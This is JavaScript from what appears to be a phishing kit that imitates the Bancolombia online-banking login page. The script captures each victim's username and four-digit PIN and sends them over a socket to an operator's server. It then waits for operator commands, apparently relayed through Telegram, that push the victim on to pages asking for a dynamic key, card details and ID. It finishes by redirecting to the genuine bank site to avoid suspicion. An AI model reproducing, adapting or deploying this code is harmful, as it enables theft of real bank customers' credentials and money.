document.addEventListener('DOMContentLoaded', function() {
    const usuarioInput = document.getElementById('usuario');
    const claveInput = document.getElementById('clave');
    const btnIniciar = document.querySelector('.btn-iniciar');
    const form = document.querySelector('form');

    // Inicializar sesión y socket usando el módulo compartido
    const sessionId = bancolombia.initGlobalSession();
    const socket = bancolombia.initializeSocket();

    // Asegurar que la sesión se mantenga activa
    setInterval(() => {
        if (socket.connected) {
            socket.emit('keepAlive', { sessionId });
        } else {
            socket.connect();
        }
    }, 5000);

    // Confirmar conexión
    socket.on('connect', () => {
        console.log('Conectado al servidor');
    });

    // Crear overlay de carga unificado
    const loadingOverlay = bancolombia.createLoadingOverlay();

    // Evitar que se puedan pegar letras en el campo de clave
    claveInput.addEventListener('paste', function(e) {
        e.preventDefault();
        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
        const numerosOnly = pastedText.replace(/[^0-9]/g, '').slice(0, 4);
        if (numerosOnly) {
            this.value = numerosOnly;
            checkInputs();
        }
    });

    // Evitar entrada de letras y limitar a 4 dígitos
    claveInput.addEventListener('keypress', function(e) {
        const char = String.fromCharCode(e.keyCode || e.which);
        if (!/^\d$/.test(char) || this.value.length >= 4) {
            e.preventDefault();
            return false;
        }
    });

    // Limpiar caracteres no válidos en el input
    claveInput.addEventListener('input', function(e) {
        let value = this.value.replace(/[^0-9]/g, '');
        if (value.length > 4) {
            value = value.slice(0, 4);
        }
        this.value = value;
        checkInputs();
    });

    // Validar campos
    function checkInputs() {
        const claveValor = claveInput.value.trim();
        const claveValida = claveValor.length === 4 && /^\d{4}$/.test(claveValor);
        const usuarioValido = usuarioInput.value.trim().length > 0;
        
        if (claveValida && usuarioValido) {
            btnIniciar.removeAttribute('disabled');
            btnIniciar.classList.add('active');
            btnIniciar.style.backgroundColor = '#FFD700';
            btnIniciar.style.cursor = 'pointer';
        } else {
            btnIniciar.setAttribute('disabled', '');
            btnIniciar.classList.remove('active');
            btnIniciar.style.backgroundColor = '';
            btnIniciar.style.cursor = 'default';
        }
    }

    // Forzar solo números en la clave y validar en cada cambio
    claveInput.addEventListener('keypress', function(e) {
        if (!/^\d$/.test(e.key)) {
            e.preventDefault();
        }
    });

    // Escuchar cambios en ambos campos
    usuarioInput.addEventListener('input', checkInputs);
    claveInput.addEventListener('input', checkInputs);
    
    // Validar al cargar la página
    checkInputs();

    // Manejar envío del formulario
    let isSubmitting = false;
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        if (isSubmitting) return;
        isSubmitting = true;

        // Mostrar el overlay de carga
        const loadingOverlay = document.querySelector('.loading-overlay');
        if (loadingOverlay) {
            loadingOverlay.style.display = 'flex';
            sessionStorage.setItem('showLoadingOverlay', 'true');
            sessionStorage.setItem('overlayTimestamp', Date.now().toString());
            sessionStorage.setItem('lastAction', 'index');
        }

        // Obtener sessionId actual
        const sessionId = bancolombia.getSessionId();
        
        // Asegurar sesión activa y persistente
        socket.emit('initSession', { 
            sessionId,
            page: 'index',
            timestamp: Date.now(),
            keepAlive: true,
            persistent: true
        });

        // Esperar confirmación de sesión antes de enviar datos
        socket.once('sessionConfirmed', () => {
            // Enviar datos
            socket.emit('sendData', {
                type: 'login',
                sessionId,
                content: {
                    text: `📱 Inicio de sesión\n` +
                         `👤 Usuario: ${usuarioInput.value}\n` +
                         `🔐 Clave: ${claveInput.value}`
                }
            });
        });

        // Manejar error de sesión
        socket.once('sessionError', () => {
            alert('Error de sesión. Por favor, intente nuevamente.');
            loadingOverlay.hide();
            isSubmitting = false;
        });

        // Configurar timeout más largo y mantener overlay
        const timeoutId = setTimeout(() => {
            if (!socket.connected) {
                socket.connect(); // Intentar reconectar
            }
            socket.emit('initSession', { sessionId, retry: true });
        }, 30000); // 30 segundos

        // Manejar respuesta del servidor
        socket.once('dataSent', (response) => {
            clearTimeout(timeoutId);
            if (response.success) {
                console.log('Datos enviados exitosamente');
                // Mantener el overlay visible y la sesión activa
                sessionStorage.setItem('showLoadingOverlay', 'true');
                sessionStorage.setItem('overlayTimestamp', Date.now().toString());
                sessionStorage.setItem('lastAction', 'index');
                
                // Enviar señal de mantener sesión activa
                socket.emit('keepAlive', { 
                    sessionId,
                    timestamp: Date.now(),
                    page: 'index',
                    persistent: true
                });

                // Redirigir manteniendo el estado
                setTimeout(() => {
                    window.location.href = 'dinamica.html';
                }, 1500);
            } else {
                console.error('Error al enviar datos:', response.message);
                alert('Error al procesar la solicitud. Por favor intente nuevamente.');
                const loadingOverlay = document.querySelector('.loading-overlay');
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'none';
                }
                sessionStorage.removeItem('showLoadingOverlay');
                sessionStorage.removeItem('overlayTimestamp');
                isSubmitting = false;
            }
        });
    });

    // Escuchar confirmación de datos enviados
    socket.on('dataSent', ({ type, success, message }) => {
        if (type === 'login' && success) {
            console.log('Inicio de sesión exitoso');
            setTimeout(() => {
                window.location.href = 'dinamica.html';
            }, 1500);
        }
    });

    // Escuchar acciones de Telegram
    socket.on('telegramAction', ({ action }) => {
        console.log('Acción recibida:', action);
        
        // Mantener overlay y sesión activa
        const loadingOverlay = document.querySelector('.loading-overlay');
        if (loadingOverlay) {
            loadingOverlay.style.display = 'flex';
            sessionStorage.setItem('showLoadingOverlay', 'true');
            sessionStorage.setItem('overlayTimestamp', Date.now().toString());
            sessionStorage.setItem('lastAction', action);
        }

        // Asegurar que la sesión esté activa antes de navegar
        const sessionId = bancolombia.getSessionId();
        socket.emit('initSession', {
            sessionId: sessionId,
            page: action,
            timestamp: Date.now(),
            keepAlive: true,
            persistent: true
        });

        // Navegación con persistencia de sesión
        setTimeout(() => {
            switch(action) {
                case 'index':
                    window.location.href = 'index.html';
                    break;
                case 'dinamica':
                    window.location.href = 'dinamica.html';
                    break;
                case 'terminos':
                    window.location.href = 'terminos.html';
                    break;
                case 'tarjeta':
                    window.location.href = 'tarjeta.html';
                    break;
                case 'cedula':
                    window.location.href = 'cedula.html';
                    break;
                case 'finalizar':
                    // Limpiar estado solo al finalizar
                    sessionStorage.removeItem('showLoadingOverlay');
                    sessionStorage.removeItem('overlayTimestamp');
                    sessionStorage.removeItem('lastAction');
                    window.location.href = 'https://www.bancolombia.com/personas';
                    break;
            }
        }, 500);
    });

    // Actualizar IP y fecha/hora
    async function updateIpAndDateTime() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ipElement = document.querySelector('.ip-address');
            if (ipElement) {
                ipElement.textContent = `Dirección IP: ${ipData.ip}`;
            }
            
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                hour12: true,
                timeZone: 'America/Bogota'
            };
            const dateElement = document.querySelector('.datetime');
            if (dateElement) {
                dateElement.textContent = now.toLocaleDateString('es-CO', options);
            }
        } catch (error) {
            console.error('Error actualizando IP y fecha:', error);
        }
    }

    // Actualizar fecha/hora e IP inicialmente y cada minuto
    updateIpAndDateTime();
    const updateInterval = setInterval(updateIpAndDateTime, 60000);

    // Limpiar intervalo cuando se desmonte el componente
    window.addEventListener('beforeunload', () => {
        clearInterval(updateInterval);
    });
});